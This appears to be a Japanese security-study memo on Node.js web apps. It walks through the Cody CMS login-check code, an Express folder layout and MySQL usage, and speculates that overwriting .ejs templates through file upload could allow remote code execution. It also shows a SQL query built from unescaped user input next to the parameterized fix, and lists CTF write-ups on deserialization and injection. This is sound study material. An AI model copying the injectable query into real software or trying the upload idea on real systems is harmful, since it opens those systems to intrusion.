`node_modules/cody/apps/Application.js`で以下の部分でログインが必要な処理をする場合に、ログインしてるかどうかチェックしてる。  
```js
  // check if authentication is required for this action
  //  and if so and not yet done: store this action and perform login first
  if (controller.needsLogin()) {
    if (controller.isLoggedIn()) {
      self.log("Application - check login", "already logged in");
      if (! controller.isAllowed(context.page)) {
        controller.close();
        self.notAllowed(context);
        return;
      }
    } else {
      self.log("Application - check login", "needs login, redirect/remember");

      controller.close();
      self.logInFirst(context);
      return;
    }
```
実際の処理は`node_modules/cody/controllers/LoginController.js`の`LoginController.prototype.doRequest`メソッドで以下のように定義されている。  
```js
LoginController.prototype.doRequest = function( finish ) {
  var self = this;
  
  self.context.fn = this.adminView;
		
  if (self.isRequest("")) {
   // request for displaying the login screen
   finish( self.loginView );
		
  } else if (self.isRequest("login")) {
    // request for trying to log in with the given parameters
    self.tryLogin( finish );
 
  } else if (self.isRequest("logout")) {
    // clear login data from the session
    self.setLogin({});

    // redirect internally
    var anApp = self.app;

    var aPath = new cody.Path("/" + self.loggedOutUrl, self.app.defaultlanguage);
    var aContext = anApp.buildContext( aPath, self.context.req, self.context.res );
    anApp.handToController(aContext);    
    
  } else {
   finish();
  }
  
  return undefined;
};

```
実際のLogin検証をしている`self.tryLogin(finish)`の中身は以下。  
```js
LoginController.prototype.markLogin = function( theUserName, theLogin, locked, finish ) {
  // override this one if you want to log the login (= ! isActive() -> failed)
  // don't forget to call "finish"...
  
  console.log("LoginController.markLogin -> " +
    (theLogin.isActive() ? "Successfully log in for: " : locked ? "User locked: " : "Login failed for: ") +
    theUserName);
    
  finish();
};
	
LoginController.prototype.tryLogin = function( finish ) {
  var self = this;  
  var aUserName = self.getParam("username");
  var locked = false;
  
  // remove login from context and session -> there is no way back...
  self.setLogin({});
  
  cody.User.getUser(self, aUserName, this.getParam("password"), function (aUser) {
    
    console.log("login rec: " + aUserName + " - " + aUser.id + " - " + aUser.badlogins + " - " + aUser.maxbadlogins);
    if (aUser && (aUser.badlogins >= aUser.maxbadlogins)) {
      aUser.active = false;
      locked = true;
    }
   
    self.markLogin(aUserName, aUser, locked, function() {
      if (aUser.isActive()) {
        self.feedBack(true, "login-successful");
        
        // remember the user in the context and session
        self.setLogin(aUser);
        aUser.clearBadLogins(self, function() {
          self.continueRequest( finish );
        });
        
      } else {
        // failed to login, go back to the same screen
        self.feedBack(false, locked ? "login-locked" : "login-failed");
        cody.User.addBadLogin(self, aUserName, function() {
          finish(self.loginView);
        });
      }      
    });        
  });
};
```
### body content
`node_modules/cody/apps/Application.js`  
```js
Application.prototype.buildContext = function (path, req, res) {
  var self = this;
  
  // get the page
  var page = self.findPage(path);
  
  if (typeof page === "undefined") {
      self.err("servePage", "No page found for path = " + path.pagelink, res);
      return undefined;
  }

  self.log("buildContext -> page", page.language + "/" + page.itemId + " - " + page.title);
  
  // build a context
  var context = new cody.Context(path, page, self, req, res);
  console.log("servePage - params -> "); console.log(context.params);
  console.log("servePage - session -> "); console.log(context.session);

  if (typeof req.files !== "undefined") { console.log("servePage - files -> "); console.log(req.files); }

  return context;
};
```

# フォルダ構成
```txt
.
├── app.js				// expressサーバーの設定
├── bin
│   └── www				// サーバーの起動
├── package.json
├── public				// 静的ファイル置き場
│   ├── images
│   ├── javascripts
│   └── stylesheets
│       └── style.css
├── routes				// サーバー側のコントローラ
│   ├── index.js
│   └── users.js
└── views					// サーバー側で画面を作成する際のテンプレート
    ├── error.jade
    ├── index.jade
    └── layout.jade
```
## MySQL
https://qiita.com/PianoScoreJP/items/7ed172cd0e7846641e13  
https://www.webprofessional.jp/using-node-mysql-javascript-client/  
以下でMySQLに接続する。  
```js
const con = mysql.createConnection({
  host: 'localhost',
  user: 'user',
  password: 'password',
  database: 'sitepoint',
  multipleStatements: true
});
```
そのあと、以下でSQL文実行。  
ここではid=`userLandVariable`をエスケープしてない。  
```js
con.query(
  `SELECT * FROM employees WHERE id = ${userLandVariable}`,
  (err, rows) => {
    if(err) throw err;
    console.log(rows);
  }
);
```
以下のように`?`を使えば、第二引数に配列を指定して値をエスケープした後に渡せるらしい！！！  
SQL Injection対策になってるっぽい。  
```js
 con.query(
  'SELECT * FROM employees WHERE id = ?',
  [userLandVariable],
  (err, rows) => { ... }
);
```
## file upload
Node.jsの場合はどんなファイルをアップロードできたとしてもそれを実行できないと意味ないのでは？？  
`evil.ejs`ファイルとかをアップロードしたとしてもそれを`app.js`から`render('evil')`とかで読み込まない限り実行できないのでは？？  
もともとある`.ejs`ファイルを上書きできる場合にはRCE可能っぽい。  

# メモ
https://www.smrrd.de/nodejs-hacking-challenge.html   
にNodeJSのハッキングチャレンジ記事がある   
https://medium.com/bugbountywriteup/nodejs-ssrf-by-response-splitting-asis-ctf-finals-2018-proxy-proxy-question-walkthrough-9a2424923501   
https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/   
NodeJSのSSRFのWriteup？的なものがある   
https://medium.com/egghunter/node-1-vulnhub-walkthrough-5635aa56cc74   
NodeJSのapp.jsはデータベースのデータをコマンドとして実行しようとするので、データベースに任意のコマンドを書き込む。シェルをゲット後の話。   
https://mars-cheng.github.io/blog/2018/Vulnhub-Temple-of-Doom-1-Write-up/   
node-serialize remote code execution(CVE-2017-5941)らしい。よさそう。   
https://www.hackingarticles.in/moonraker1-vulnhub-walkthrough/   
Node.js deserialization exploit for RCE   
https://cybervaultsec.com/ceh/hackthebox-celestial/   
HackTheBoxのCelestical.NodeJSのデシリアライズっぽい。   
https://www.doyler.net/security-not-included/nodejs-code-injection   
NodeJSのコマンドインジェクションのWriteup   
   
https://gist.github.com/mitsuruog/fc48397a8e80f051a145   
Nodejsの基本   
https://developer.mozilla.org/ja/docs/Learn/Server-side/Express_Nodejs/Introduction   
Node.jsの基本   
https://qiita.com/ganariya/items/85e51e718e56e7d128b8  
Node.jsの基本。わかりやすい。ミドルウェアとかのわかりやすい解説。  
https://thinkster.io/tutorials/node-json-api/configuring-middleware-for-authentication  
途中までだけどreal-worldのNode.js版のModelとJWTの実装手順が書かれてる。  
https://qiita.com/tinymouse/items/fa910bf80a038c7f9ccb  
Node.js+express+Passport  
https://qiita.com/sa9ra4ma/items/67edf18067eb64a0bf40  
Node.js+JWT  
